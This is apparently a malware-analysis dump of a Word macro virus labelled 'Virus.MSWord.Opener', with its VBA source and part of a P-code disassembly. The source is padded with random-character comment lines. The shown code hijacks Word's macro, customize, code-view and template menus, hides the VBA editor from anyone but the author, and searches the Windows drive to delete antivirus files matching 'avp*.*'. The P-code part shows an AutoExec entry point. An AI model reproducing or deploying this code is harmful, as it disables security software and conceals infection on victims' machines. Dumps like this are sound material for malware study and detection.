'¶Óë¶ÑëÛíÓÒã¹ÖßÀœ¸û®¹ø®åÝÑžþÃÚØÉ¨èöªŸ
Rem ±í·­ÄÈË
Rem Ýä¿é¬¼ùÙÝÝ¿ýÏûÎ£½ù�û¨þ¾²¹»ÚÅÅÝ·¯ÞôÀ·¥¹å
'Ûð°áôÁÍóñØ¤�ÊÎ›²çØÔ
Rem ×ÝýñãÎÓÆìÍÎÔ³Î
 .VirusProtection = Authorize
Rem £ãÛÃÂ¬õÒôÕáïäß¶³ùÖã§¼�»À¯¹Ñ
End With
Rem óûªî¿¥à óß²º²Ÿä÷ôÃÁÇÔ¹ÔúÒÛÏüÝÔâ²¨¤¡¬§Çï©œ©ÀÃÈ÷
'­º½ÏÎü¤ì
'íÊœù¹º¾£©
MyMaster = Authorize
Rem ßõó¨ÜìÉ±Ùùã®ªêÚðã£Æ¬Åéà¤½ê¨ªçÈ¨ó¡ë¢òÅÎ½Û¯Ý¨´
Rem �Þº²µòàòêâß¨ Î³»ÔÆí¹¯Ö�Ê­õ›Ìýâáèé¨áâí«úá
'ªëäÁù¹ÅÌìóïÍêÝ¤äñóóë¨Å›
'œà´Ô³Ú¹Ø·åý®¿
'ñœÖì£ ªïÚºÄã
Rem éó¶ÕË¾òÊÓàôžàÑ½Êæ›î« ç²ØÊú©´¬â�ó¯×¨öèá¯½·ÈïÏ
Rem å×ÃôÒéíÓÕ¹¨é³«çü¬ÚÀð¬ÈªÍöïô·º²çÀããð¬ò
Rem ÆÌ¤±ŸéÏçäÔ¿À½²ß²ý½øÌö¨Ø¢£Ûê
Done:
'¿ÙÕ·ûðÊ×êé¯Õ�¹ê«¢Ö¿
Rem ¬¡«¨àÙîêËæß³ï²ºò¥èÑÇÃØ
'´÷ê¢îðåå�Ç²·°¯ÛßñÍñÌå
'ë¢ÝÈ
End Function
Rem êŸ»Èý¬ÑÞÃÄ¨é­Í² ÄÆÃÌœÓöøÉáðò¬èî¦Þ½×¥Óï» ª
'êò¸½ÁÌœ®ÊþøúÄµÑÑ¦ÑÁî
Rem È­ÕÂÐç®½¤Ð®©¤¨Ä±Â½ªÙ¡Ç·ß
'¥Ä³ìüâ½¬Ù¹ãÈ»º¡›áíÂ®¾ùÒø²çÆýåŸûœÓÙî¿¼Óþ
'¨óþ
Rem Â§ŸèÛ¨Ç›Æ¡È´Í¬œâÉü°œÙ£ùÅ¿á´åÊü
'¡

Rem »ÐòåžîÐùä
Sub ToolsMacro()
Rem ê±èÇ¢Ó�ÚÅÇ¶ûüýðÀŸÛ£îõþôÎ¹»¬ÝØðô»öðúåÛÃèÑ©ûãÛïÚ§ö¸
Rem Úð¦áÛ°Ú¦µ×ÐøùêùÊæí®ÇÌÌ½ºÙÓÌËúêð¡¢ÚÊÏÌäð
Rem «²Þ³ÃÖ¡¼¢Ï±íÆßéæÖ­©ïÍ
Rem ›âÝÔÃî£ãÊèÑºÓâõÆºñý¾óù¢ïòÂ¶»÷ÂÌä³Ô
Rem áÌÄïéô¡£²ßû¹ÐÜ­ž�ýÙ®íÈÀ³ÐÇâ›ÝÞú³æÝù§½›Á°Ù¸òÃð÷á
'ÐÃÕÈ±¡§�Ø»ï¤Ë²¹ô»ç·›Ó¥
On Error GoTo Done
Rem âÅ¦©¨úóÑÏá×­ù­äñÅýÁÉäÊÈÇû
Rem žëÀò¸Õ¦©ç£Ù¸›£¸¦ëØÚœ
Rem ©À¤žúëýÚ©þõ£ðÆÙÕ¬ë¶©äªñª¡ïÑÝà®ÎÆŸõïäþµöó¶œÚÑÒ¢
'¼÷¨ôÍë¦ïäÙò
'ÙïÑÂí­Æé­¯êªÎßèá¨é»¹¾
Rem ¨Õá
'¸µ¶ÑÜ©ÎöýÓãÓöîÉÏ»ÐÀÍûÑµëùèòðð×ÈÚá­�çØÀÆ»°Ê¯Ñëçý£¸Û
Rem õäàÒÏÌ·ôøêÒºá¥ÏÉñÍÃ½¿ÀÈø¬úÇÒ¶Ì�ü¹¹ã·úÇèÈ­
Call Stealth
Rem §Ì¿óåÍÎà¶ä¢û
Rem ùÝ¥Ñµ£Ì±Æà¡£÷çùôîâííª±Ö¼ñ¤ê�Ýðé
'§Úµ³âîÉ÷Íáó½žÓæ®ñÚÒËâ
Done:
'µçâëíáîÇÜà¦Ó¥Ü›¸ÈâºØÌÀçî
End Sub
'øÓÔÃÙöžµ¥¢ËéÙü¨ÕëÊ¹ëÚ²ùð¼¾ãõîàü¥¥þÂÔ²çÆª©ïË
Rem ëê§Óž¨îžÕ²ú¤îú¨¸ê®ð×²ÓÈÇÑíîÏ¾Ÿ›»ñÏ°Æ›Ê Ö
Rem ¥Ì«ÅÆºýõô›ËÅœ¿ûžëîëÍ®�ñ¬»œÖßÇ
'Àæ§ÑÈèüý
'õý¹±£ä÷ÍßÅ¯ÄÅÐÔõ

Rem üÒ¯õÀÔ¯Ã¦ÁÍ«ßõøÔ¡àÖºÄÛÅÌØØÕÔÇÝÒ ×¨þòÇÈ¿ÙÅÙµÃÀ×
Rem Ë·´¡›»ŸâèßåœÃ÷¾õº´ù§Å¼
'ÞêýÎ±Õ£ØÉúÅ�å¹Ë¯ðãâå´µÝý ›çÌé
Rem ®íþÂ»ßÆã¢ûêí�¥®û»îï²×É·ßÜìÉ­îþÍ›´ñ¹®à´çà·üô­õÑÕá
Rem §›ÆÌÔÜ³ÒäöüÐý½øåí
Rem À«±ÕÆ¿±ÏÐ øé¼Ýæ¤íãé¥²ößéððµ×
'òÈÏ°Î¼¼·ÛãÑ°ðìëÒ¯Ã
Rem ¸Óî¤®£ÅáþÕ÷ò®Ñ¬ÏêðÙå¬¼ ÛáïŸó¡±³þÃþ
Sub ToolsCustomize()
'ãä§æ³«ÖéÒêß·Î¸ðÑ°Îúß¯œç Â¶¸¼âÝí¾Ñ±áçõ¦ô¿½
'¯Ú¹ßÈ®Äâ�´àµõæÊî¸¢íÓÆÃÁ ²÷çóÜåìöçÔØ¾
Rem ¯Ñø» Í»ª¹¯ÍÅéß¨¨ÞçÂÚ¡ÚÀ×©¬­Þ¯ùêñ¿�Ûç ÒžÆ´›®¥
Rem ­ÔÓÄÈÁþµ´ç»Üà¶žÑÜ²¾æ¿öÜÏåÇéíÔÉùÄ¸ÔÏØÚ
Rem ïþ¢ìúÍâ£µù£Ûºº§ðÌ®œ½´òî£
Rem ý�ù«ÂÙËºÀ¢Ýî¾º¬ÀµâºâäÖÓ£þÆô¸ÓôèÕÛÏ›³¼´µúÍ
On Error GoTo Done
Rem ÎàÂÝØ
Rem é¤ïî¨³Í¼¡›½«¯ÂÍÂ¥ßÁ¸×ºîà÷Ó¯þÐüŸýä
Rem Â¢Ôœ«ÃËÂÍæ¢ÆàûêýÜ›Û´®
Rem ê£á®²ðëÃê
'ñÈýÏ¿œñûÑçÎžœ�Èñ¼»Ëä
Call Stealth
'ó¥£Ï­ ÅæÊø·ÁÜ
'¾ÑÙýÆÑÞÊçö³Ï©ùÁ¦£ëÔŸÖ§ìÆåÀÚüû›Þð¡±¬Ò á¨¹á
Rem ºéýÀé­¬ÅÕÜìŸíÂžëý¹êé›£ãžùüäãË½Ä ¬ý£úÄ©âÍ
Rem Ë£Ðë¬¸êœ´ÞØÍå Øèðêüê¹ÛÒ¾ÈËü ªÝ¹ª¿µÑ
Rem úòßÕÝÚÆ�¢  ·ßå¨´íøÊ¹·Ç�®å
Done:
Rem ùí¶æØÞõœ¦žúµ÷áÃ³äè
'Å
End Sub
Rem âè§ÔÕýç

'ÎÛ§ßµç¿ê«¯É¡Åú¹�õ®¹Ô½¿¦úÈþžËâÀ«¡ô
Rem ¿¿ çò©ÑÐÔáÙâÉÍÙ¸ç·þîø¦­ùÁ±²ÁûÌ¬¡­ê
Rem ³››ýãïË¼ Áý³í¾þ°à¯ð
'ôÂË›Å¶­Øª¥½óïºÚûÆåÌéÙþþ²©ÕÕ®ëäÊ³¹¡éªæòÏ¦�º±
Rem ®¾é¡ÙÐ×¼ÀÂÈ´û¹
Sub ViewVBCode()
Rem é©ŸÉÛÁ×áù«œøÙëé½ýÚ¼½ëÌÕî
Rem ¶¿â
'ü÷ºä
Rem ÝŸËµ²â¬óž£Í¾þí¨ÛÄÌ¥Í®êœ«ðÚèå²ù
Rem ü®÷½éâ¶½ÂãÁº¼©®Â¼©õõÝÄ¦ý�²Ü¡¾¶
'´§æ�¶×Æ¿ñëàâ¦óåÄ²Ùø»ìãóÏéì¼åªºåÐÍøÞ©®üóµÃÄ«ÂëÚœž¡Ÿ
'§ºÓ§¥ÊÐÚ¥Ý£¼ÞãÅÒ›ÇîÃ
'Î®òþ±ÖìËØ× ê½©ùºûÓ
On Error GoTo Done
Rem æäÕâ¤¬ÔÍ§Õ×ÈûëÑÕÈÆžà©¢äÉõ¶Ã
Call Stealth
'Þ¥¨Ü×µ×¬ý§èª¿âÐŸôºùõëó£Üæ¨ç¢ñÃ÷ÏÎ²
Rem óéùÉ´õßÞžþç¢ÙÚÄ­ñö¶µÅÕ¡ºèï æŸ 
'Î›
'ü¡¯¦âžÌ¿¼ç°´¼ÍÐÁ¾œ©ù²ÃÖÉï
'·ÖÛÆëæíßÆÊÑÓÀÙ÷Ý¢¸¿äÉ§Û¾ù»
Done:
'Îßª½¯Ã·ê¬ÂÉØÅ²íÕ£¼¨Øï±àü¼âž¸«ãº³ÜöÎ¦È�»úí›ó
Rem ï¥È¸¯úï¡ê¶ÂÕÅÐùí÷
Rem ïãóÒÆ±Ãæºñ·Ã¶¡µÈñçÊä¡éº®Éþ­ñÃ¦ïØà¼ÚÚ±á
'²¯œú½Û© Â±ž´÷øÜîÓ
Rem žþ›©íéú£¼ø® ©«²Å²ý¶ÔãÈëüÀæù©éËØ¼Åá
End Sub
Rem âë×ØÜÄ¹Þâ¬ð°·àÄøÜãÛ ÚÑÙÎì£ÏýØçž×£¤

Rem ¢ûãÊ³Ûð»ØÍ©Õ¯ÁµÝÈøË©¹³áì¢¹§
'¬éËõóå�Ý¨©°æÞïîÉÑýøÁ÷­¢ËïÑÄüÖ¾Ì÷÷ØéØõ±üÜÞ�žíêÊœ
'«Ð Æ¡®îÝÉË«åçâó¤ôÉ÷ñÙöÅ×ËôÓ
Rem à­ËêÔ®º×¤ÔŸÈ©¿Öìæ« ØÙÓØÄ
Rem ¶ËòÞ¯ÈË¤úî¨ÍÂµÀù¼ÉÊ¹ýý®þ§â¾²þ¡§¯�þ¢ò­äûÜ
Sub FileTemplates()
Rem ãÐÎÚ¨òÉÓáçåÚÖÜ­åÞðŸÖÛ®ýÕóÊîæ£×œ®ÒÓí
Rem œÆÏ¶éÒÜ«þýõÕ�ìÄå¨ÅÍÆö°Ä×Ë£óã¼ÞÆô
'ÅäòóñøË¢õß¾ï¯ã­¶÷²¿¾ÓÆ¬ÇÊùàÎ«ôÈ¨Áê
Rem ï§ÊÇðáàØÐëßÏø›Ûãéêž¡ ùÊí´ØÆëÊ®Üý¯ú¸Ÿî¿óÕ
'þ¦ÚÉØêÞõÃôâÆÐ¢¶´ÂºëÛžàÏÛ¸ðúÀç±²©Æž¦»¦œíü
Rem Ó¨áãî
Rem ÚÈðñëÃÃíî¹È­›èî¿³
On Error GoTo Done
'ò
'Ÿ¥ßèî´Ï­ÖãÐÒýèÆÉ±ûûºýÂ´Ì¨âêª£î·ó›Ä« ç¦÷
'Ó§È´£¯�î¯Ÿàœð³½¡Ä¬Ñ²¾é«ð
Rem á¼êÜÇë¦»¶Ì®»»þÏÚ¸¥ñ¾ØÏ¹â±·÷ö·÷¸ØÇÃæ¸þç¾²åÓÕÀÔ
'íï¥ô«Í
'Íõ£þ¶ÉÔëçýëÉÅéç²øÓºáúýÀ¶á¡ñÃ·³¾Ô
Call Stealth
Rem žÉ÷¨ºÜ ÁÂÝž©åÏÊÓŸÛê¶ÜÀÝ±ñ· 
'°©¹Ï¢òú
Rem ¿ý›Öû²î¥¬¬ ¡¯¥ýø¿�åéªÁ´º©ÄøßÑÀ°
'ÈèëéÂËæÂþ°éÆ¯²Éó¦Î¿
'ÝŸœÛâöªæÑãÕÙ«ôãûÝÔïïþÃ
'Á¡ù¼
Done:
Rem ¾¤ÌÊï¾¼öÄæÎø¾ÛÉý·¼Ý´ÖðÏµØÂîµÏÖ¨½ Íå´ï¹ÑŸáëÏÃÊß
'àÊ¦¼¢µã·×²
Rem ÑïÏèœñö¡ÍŸ©çýÞîâîçÁÂÒŸ
Rem §áÙ›´ò±Ò°ñ
End Sub
'¨¢ÙÝŸã¸Õ»ÑÔ·¼÷ü­œÉÁ×Ú
'ó·ŸûÂ¦´ý§¸¼Ü«çóïïä
Rem Üòºçú¾Òê¼ÎíÅñÅÃ
Rem ¡ê¯ú

'ðß¯Ü¦ñÐ
Rem ð©ü­�Áå­î¼
Sub Stealth()
Rem ÂõÛ­ÔÉÆ©Í›Óµ·÷äß›ÞÓäœî²œžüýŸô¶®ë¦ñÃù
'ôç
Rem ªüãò¡ª³ùéþÎÒÇ
'­ÔÙ¥è³üÛ§Ÿì°ûßª¬ïÈ¸¦
On Error GoTo Done
Rem ½¿¹¤±¿ªé®¤êžÓ¸œæ¤ÁÃ´µÛ©¶¹›»ÞŸâ¬ûÄÜûÍç
'ÍôÅÍæñží§ÒÀ½æ÷²
'¤ùÖÖ¦žÛ±ÐÏÙàá¤ÇÃêõÑ³×²Ÿž¦ìßæêúÉÔÙÂ¥Ïõö®�ëá¦¨ÜÈ
Rem ý³æü¿¥œÉòÄ·åÊœœßœ â÷žÔª¼»õ··
'òÚÔªüÄåð¡Àö
Authorize = (Application.UserName = MasterID)
Rem ÐÜ×Ã»Ü´µ¢±ó¥«ðüÙø·³ôÛÀŸž¼âÑæ½ýÙÑÖ¢ÖáÞõÔ�Ù
Application.ShowVisualBasicEditor = Authorize
'ÇµžÙÈ¬­°¸×í¹åôëÒ³Â ¸±ÌºÑ©ÑÏÝ¶Âýù³ð¸
Rem ßžÒØÓªßÑÙ¬åâï¦õŸ©¦óïµøÜÚ¾ŸùÝ¼ØÉ±�
Rem áýñÛ¾¦

' ÛïÙ²½âï
Rem É¶­³¸êÇí²ÝÅì¯ÜÔëÝå
'¬åäÌÔÓý½ý´òÐÓì¥÷úã
Rem Ñµ£ÈÆÑ í°ºµÈ
'ØÎÔÉÙÇÞ«¯ÃÄí¼ÅôÒÁºïØ³¿ÔÌªç
Rem ¾åì­ÄÐ¸ö½›æÝÌ§Ìö¤
If Not Authorize Then
Rem Ü¶Øº¥õÕÔÔÉäÂ¢ñÍõîÂ²ÎÂ¿­ñÊÏ¶ÞÖµÎ·
'»úóÄÅôŸèÜ¢Ý¬ÂèÙûîïüñøîñÈ¯
Rem ·§ÀÂðÆ¨í³£Ñ¶Ðü»»œÉðÊ¡ÔÎºðýÞÀæèÓâÎôä¹«ÅÆ¦ãÎØþÕ«ã
Rem Þµ¦Ð÷¥ÙÝ¸Ìä¶Çóè
'Éñ¶æÉþ°ß¯÷é
Rem åÙ›£µ³½
Rem ÜíÀÜðß³È÷éÜéžôëÞŸÔÂçú›½ø¤ÃÄÛœ»ÆŸ«ÒÃð¼ú³üëïÂê
Rem  ÀÓ©¸´ûÖç£Éñ½ûà¹¿ÕÐÈß¡ÓäÊÒ´ùéØñËìº¦
 With Application.FileSearch
'ÚøâÂ£¼üú¨è×ü¥ÌºýÁÌÐÃÙž÷úÙñÞâŸ¯ÓžìÊè¥·êÁ»¬®ãÆ²
  .FileName = "avp*.*"
'Ûà›ç³¥óÐÃù°éàÚ¨æ¾áÒÄÅ°ßêÜž¼­³ïüñ­
Rem íÊ¦é£Ÿ«ŸæÄÙè›¥¢ÛÑîÒú¤ÅçžÅÌ
Rem ´ï¹ÕîÜ�á¹Ã�æïÐ¨ÖÊó¡Úãðé¹÷»ðÃÃ»¿¨³ÉÜñý¦íåø
Rem ø´
'ÞõÓ¨¦«ïóë�®èŸº¢×óÑõºùÎ°ÉþÞ×Ê­±ÀØ§›üæà£©ëÔ¤ô
  .LookIn = Mid$(Environ("windir"), 1, 3)
'¥ëÐóþçÄÚ¸öÒ´ª›£ûéÏœÍúÃúá¤Ðßñ³ûÍ
'õ®ûÕÊñÓáªÍÁèŸ³
Rem íÈ
'ÑË³ž�´Ÿ¥¬Îõ»õùÏÎöóÎç©ùê¼Ÿ´Ù¸ÍÐÑ�
  .SearchSubFolders = Not False
Rem ºµ¾¾
  .Execute
Rem è¯æòµÙÑ¢ãïñü®ÜËáý£Î¾Ïë«çú¶®£Ïâ«¡ÞäÅ¤öèî�Â¶
Rem ¹Öí®þàîþçÏÖàÓµëÑ
Rem óéî³óß­ê´¼åÃ»«ðþÑ¹ñÈÆÓ›ŸÁ¶ûØ¡í¸ÊâøÊ¤¦æëÏ·Õ›
Rem ÎÑà¥Úìâ¶©ø¯›¥Àßøœ»Î§¥ë×¡ÀËìÀÁÀ§¹í¥Ñüé¢í¼î¸ïøç�ëÁ°¤
'óž©âÜúÎ›»¤Ãª®´ÀÙ¾ï¦Ôãê
Rem ñ§»ÀÎ¹ªÑòÃŸžßöÉÛýÀæ
Rem áŸÏö¿úûöªùÔþóÖô
Rem ÆÌÝ§ÛýÒ¥ÌæüÅÏÆÈ­Â
  For i = 1 To .FoundFiles.Count
'ÜÊÌ¤¤±åÐú
'øëôðÃ¸Ñ¿±Êì
Rem  êÑÃµùÆËÕ¡Ò¼¥ á¸ä¾ûê¨°�Ê¼Þ
'±¶¸æßÖ¡£ÍÃÓÏ¢ã®ÕìÐÊÀ¸³Øý²÷èÑ¦½¬«ÖÚíÈæë¥ùùý£­ÊÃÎÔ¡§
Rem üÎí¯üÌáïûÏ¾ÄÆ¼ŸëÙÁçáÇªÔÞ§£Öœá¹íÂ§ªá­®ÂÃÕ³®ðÊÖðÒžÚº
'îÂÚ°ÀãÏÚÔÐÔç¢§¼Úã£Éý¸¹æ¢ôÝú¾¦Óºëû«ï�Ó¸Ä¨Ï·Ï¼¬Â
Rem ÄŸËµÈíªö®±ïýÄ¥ÁÔß÷ì¼žç¾´Âž³»çø´ñ¦ä Ú
Rem ªä½œê¨óóÈ§íª¨½
   Kill .FoundFiles(i)
Rem à�²¼ù®áä¡ÝÙç¼Ë›î²¬ÍÄžñô×ª²»Â¶
'å®µ¿ÁÆëß¼Øõ­°ÓŸÖ¸©Ð©¹õà£øÃçô­¾Ô·ÁÇúô
'ù
'³ßôþÒ£ÊÚ­µÅŸúãÇÐÕ´½¥ëØŸÇ®ù¸çïú©ºÜï¯áÍúØù¡°
'Ä¸÷ÍÄÑ¨åíÜÒ�©¡�¶¯¬ÒòÕ±ÕøÝþýºÍ±æÉÌæÍøØËä
'žé¯œ¬Ò§¸ùŸùäÞÏ¶±ÓÒ
'¨ä¼ÃÆª÷ôöØÔÍ¦ß¤Ï¥¿õ½ÙÕÙîŸÉ»Äý¸Øûê²ÆÁßîÒ
'³úÖ±³éÂáõ°ÒÑ©ýÖªô
  Next i
'«äÃŸá¾ÛðÎø××¤Å©áÅ¾½ì
Rem ª ß©äò·öÓé©¸¸äØàÂ¸
Rem ÈÓÚÕ¿ö­ö¤·¥ê¿Ì­­ýž£Ûúð­À¼áÆŸð»æ·¶ÂºžË¬ÎÒ¾ûß
Rem ¯Ø¯ ËèÈð«¶£´êÛ›µ¹µÇè÷Ú¾âð¿¿ðÞó×
'ø·Ý¡íùÊŸÁÎçïáªìÔÚãÞœžª¶·
 End With
'·«Éìî¦ÐÏØáàžðÉçÖâ¢¥åËñ±àÌ›�ÂëÎòÆÙþÃ
Rem ¨ŸÀþòºçøËöÇ²³Æ´¿õœÑ°›Ñ·èæçúÐð
Rem ßùõö�ìÂñÙÆ  ´ÝæÕÔä°ú�Ì»ªÎÂ®Õñ¯øÕøÏ¯ñÓýÏÓµµ¹
'ëÛùÇºôÚæúù³ÂÃµŸÉÎá«Î
'úÈð¸£¯ùãÂª©àÑ»Ø«¹´ðœæäæ¢Ÿ«´ù¤éñÏôÐô¹ÛéÈÆÔä©Î×ÒÖ¦
End If
Rem ¦õôÄâºíó³×¢ÓãÄÜÕ©
Rem æÏÀ¬·à¿Ì³ïÎúîï÷°½µÔ¶ô®õäõå°ÜÀÄä´ì
'½œìœÉÏÆÊîñê��ÏïÐ¿ãÁ°¥ðÞ�À
Rem áí×®â¡íÊêìÂýºñ®Ó
Rem öÏöøñÄçÐÂÙÓÝªÖÖÄ
Done:
Rem ®«¶õõîÖäó¹å¾ÑÌÃ
End Sub
Rem óæ¾ÊÝÑ¿¢áØ¿³
'ÓÎìÕ¡ë½ÈäÝ÷œ÷°Õíô÷ÁÄø¢õà»þØü�žðõž¼ÝžÚ·½¯´
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Opener
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/Opener - 73028 bytes
' Line #0:
' 	QuoteRem 0x0000 0x001B "Åâà±ý²­¸úÕ¨¯Ùž§ù ÚÊ²ùÃÐáÀ¾ä"
' Line #1:
' 	QuoteRem 0x0000 0x002A "¬Äœ£è¹œæÉô›»ýÅôô¯âúáØà �Öãîî¾ÕÕ·Þ¿êìÄöÑ¤ä°"
' Line #2:
' 	Rem 0x0010 " £¿ÀÔõÆ¹£«üÈ£Ó»Ì"
' Line #3:
' 	Rem 0x0019 " ÛÖäùæ�ø×ÚÎïÏåÀÈï¡½Ì×ô°Ñ³"
' Line #4:
' 	Rem 0x002B " ýé÷ôÝòþÉ½È¬öë»ÑÛð¸¢Éö³ÖÐÍêÞõÄî¢õÒã§³ã»åöûÞ"
' Line #5:
' 	Rem 0x0010 " çÎåÜúÎê¨Ä³¢ÝÈö¿"
' Line #6:
' 	Dim (Const) 
' 	LitStr 0x000D "Êîí(åðâíûéÍîæ"
' 	VarDefn MasterID
' Line #7:
' 	Rem 0x0007 " ¢ÀÜðÏé"
' Line #8:
' 	Rem 0x0008 " üÜÈ¢ÉÖª"
' Line #9:
' 	Rem 0x0023 " ¶›ÝÍÕ¹íÔÈ­ÈÔÌèÁÎº¦ÙàáïÊèÄÚ§Ïëº´Á°î"
' Line #10:
' 	Rem 0x000C " Ÿøø¯ÙÐóóíú·"
' Line #11:
' 	Rem 0x001E " éÐ´³×¤´ö¿·ýÓÖãœ®¹ÕµãÛÓ ò¾Üôì÷"
' Line #12:
' 	Rem 0x0031 " ÈÍ�éÙ×âÌñËžÇ¤½Ò¹ø³¸ÍïèÞ°ùË³®Þ�®»¤§ÕòŸ¯¹ÖýîîÌÖôã¾"
' Line #13:
' 	QuoteRem 0x0000 0x0019 "ì¥ÙÞ±éÒç§ÁÙØ¨Ä¡ËÝ¨ååíÜþ´ª"
' Line #14:
' 	Rem 0x0025 " Ö­´Ó÷ÕÝ·ß¯ïÃŸæ¡óœ¿Ã¤Åæ¨÷Ó³æÙ×ÊãÄê÷¥ó"
' Line #15:
' 	Dim (Const) 
' 	LitStr 0x0006 "Opener"
' 	VarDefn MacrosID
' Line #16:
' 	QuoteRem 0x0000 0x000C " ªÒÍ²«ØëÞÕïÁ"
' Line #17:
' 	QuoteRem 0x0000 0x000B "¹Ìì›ÏþÔâ³¥¬"
' Line #18:
' 	Rem 0x0007 " ýïÙì�§"
' Line #19:
' 	QuoteRem 0x0000 0x0025 "ðåü¬°¯ÝÑÇ®ÆêêÚÅÜÊÔÅùÈêž¡›«Ö®œåí¹ýÝ¹óô"
' Line #20:
' 	QuoteRem 0x0000 0x0014 "Çßá®àÙÖªÖ¶½ÖŸ¾ËèÄ´Ñ¤"
' Line #21:
' 	Rem 0x0023 " ¥âÚýáœ²ÄÂäÌ¯©õÈÕ÷Ñ¹ÍÖ œÃÉÁöìâýïÔÈÇ"
' Line #22:
' 	Rem 0x0004 " Öùß"
' Line #23:
' 	QuoteRem 0x0000 0x001A "ÃÞ¤±ÅÓµîùæ³ŸÜº¯û¯ÎêÂ¤ ½ý¼ž"
' Line #24:
' 	Dim (Const) 
' 	LitStr 0x0004 "2.11"
' 	VarDefn MacVerID
' Line #25:
' 	QuoteRem 0x0000 0x0004 "áÄ®ú"
' Line #26:
' 	QuoteRem 0x0000 0x001D "ßÕËµÑÞ÷ÖÅ²Ä½®Õ¯¶¹µë±øæŸ­éìç¢å"
' Line #27:
' 	Rem 0x0025 " ¼±³à¬·¥èÛÇÛêÅÀñø¿«¾ÔìÍ�²ØÎÈ»û¾¥ÜóÔ±Û"
' Line #28:
' 	QuoteRem 0x0000 0x0026 "Ó·Ìíãö�âÁà©ß¯íà÷ÍÑÃûßñÞ²Àž¬ÇÂë¤ßÂÃ²·º²"
' Line #29:
' 	Rem 0x001D " ÌÆâÕÛ�ËÄÐûÙñ½ïëÙõÁ¸ÓÔÝ¸éú¦úÑ"
' Line #30:
' 	QuoteRem 0x0000 0x0026 "¬êÐ¨¬ÕÐÜæ®ÈÉÀö·åùãžÞ¾ÚÚÞééÔÁæºÄÂ÷úïæ×Ä"
' Line #31:
' 	Rem 0x002B " ¥ÊØþåî¾œßæ§òÆÂÁ¹©õ×¬ä»×«Ó«éµ¥éœž§Ê½Ñï¾Á©Úù"
' Line #32:
' 	Rem 0x0004 " ÙÑá"
' Line #33:
' 	Dim 
' 	VarDefn OldHome
' 	VarDefn NewHome (As Object)
' 	VarDefn oldPath
' 	VarDefn newPath (As String)
' Line #34:
' 	Rem 0x0022 " ÁÉü·ßœáÚÞÛçÃ¸äÅÅ›¡æ­²ÖÀÍÍñžíÄºô½µ"
' Line #35:
' 	QuoteRem 0x0000 0x0014 "=>Ìîÿ êîïèÿ íîìåð: 6"
' Line #36:
' 	QuoteRem 0x0000 0x0005 "ÍÅùÕó"
' Line #37:
' 	QuoteRem 0x0000 0x0010 "›ÂãÕÏøÑÓ ãíÌÜË×å"
' Line #38:
' 	Rem 0x0022 " ÚÈ¦ÔÃØùôðð²äñú¹ªË®œÊøÀÞãºÖØê§ïÖÂÈ"
' Line #39:
' 	QuoteRem 0x0000 0x0007 "Þþ°¢áèŸ"
' Line #40:
' 	QuoteRem 0x0000 0x0024 "=>(opyRight [(] MasterID, 7 Nov 2001"
' Line #41:
' 	Rem 0x0014 " Þ�ÅÊñ¥û¯·æ Ð¶×çÂÇÐ¾"
' Line #42:
' 	Rem 0x0005 " ïôùÈ"
' Line #43:
' 	Rem 0x000D " Ü¥Îçªøñž«¬›ç"
' Line #44:
' 	Rem 0x0021 " �Ôù§îæÂÚÊ£ÈŸ²Ö³ÅÒúûÚÕÚ¿íÓï�ãù®·å"
' Line #45:
' 	QuoteRem 0x0000 0x003C "=>ÿ ìàëåíüêèé ïîëèìîðôíûé ìàêðî-ñòýëñ-ñêèòàëåö, âîò è âñ¸..."
' Line #46:
' 	QuoteRem 0x0000 0x0032 "ãÐ£¢Ì¦ÅÔ­¶¥ï±¼£«±±ÏµÆîßÐ¥¨ØžÌœÒ±à÷§Å¨®²¢ù¬èãù¤œäÉÜ"
' Line #47:
' 	Rem 0x000C " òÂÄ©öê¿Ðâ«à"
' Line #48:
' 	QuoteRem 0x0000 0x0014 "¯®ÂÛÄ¼ÄùªùïßÓÔ©ù¥çù°"
' Line #49:
' 	Rem 0x0008 " ¼äªéèÌÁ"
' Line #50:
' 	Rem 0x0007 "  ØÜû¥Í"
' Line #51:
' 	Rem 0x0030 " åÇú­ÐÈÙðµèéÞÔ´óÓ¬Å²á÷ÀÌºÛ¿î¤Ú­îÍû´ªáÔËþ¼�õ°úž›º"
' Line #52:
' 	Rem 0x000A " íž¹¦òïäûÞ"
' Line #53:
' Line #54:
' 	Rem 0x0025 " «ö­­êôÀ÷ÀÐ ëáÂæßõþŸµÔÑÐ©Õ¸ÙØçèø¯¬ÝÕ›"
' Line #55:
' 	Rem 0x001A " «Ýï¤Ë°ÁÜžÙàé±¥ó¤À¥³ÞÉ¬ï¯Ô"
' Line #56:
' 	FuncDefn (Sub AutoExec())
' Line #57:
' 	Rem 0x0004 " «œý"
' Line #58:
' 	OnError Done 
' Line #59:
' 	QuoteRem 0x0000 0x0007 "ØÍ¤î¬½è"
' Line #60:
' 	Rem 0x002F " Í»øýŸê¥Òîâ³©åÜ¨©ÕÃì åýÞÂÙ¾´·ìùæë�í½¤ãå±³ØïÅòã©"
' Line #61:
' 	QuoteRem 0x0000 0x0018 "ÆçýåŸù©ö¶ä£ùÃÍ§Ò«¬÷ÄÌ¯Ó�"
' Line #62:
' 	Rem 0x0023 " ¹µÍœ©í¼ã§µ×õÁô»àö¿ÈÅª¡éð·­Þª±ØÄÙÊÏ"
' Line #63:
' 	QuoteRem 0x0000 0x0027 "Þä¨åïîæíÊž×á»ç¹Þú ã»›ÙÚÑ·å§°Ðòëæ›ýÞ·âßð"
' Line #64:
' 	Rem 0x0019 " ¢û²÷Àº±Ö³í¡Þøá¾î§îÓ¢ÐœÓ²"
' Line #65:
' 	QuoteRem 0x0000 0x000B "î¼œ±ÆØã²ç¹Â"
' Line #66:
' 	QuoteRem 0x0000 0x0030 "­¼øÐõ½±ÑþÉÁ¨ßâÁÚÈ¿½ïº ± ðà¶åŸŸª¤ì¢ó¯¶¡Ñ¤îÍÙÃûÜ¶÷"
' Line #67:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #68:
' 	Rem 0x002B " ê±�¯ÎºãöÝæÓÝ¾ÔªÐÒÀ»›ûÈùÁîÍÒœÃ³â¥ªÞ¨Ëê¦Îœü�"
' Line #69:
' 	Label Done 
' Line #70:
' 	QuoteRem 0x0000 0x000B "Òºâžì½ú§ùÎÏ"
' Line #71:
' 	QuoteRem 0x0000 0x0005 "Úùž›Å"
' Line #72:
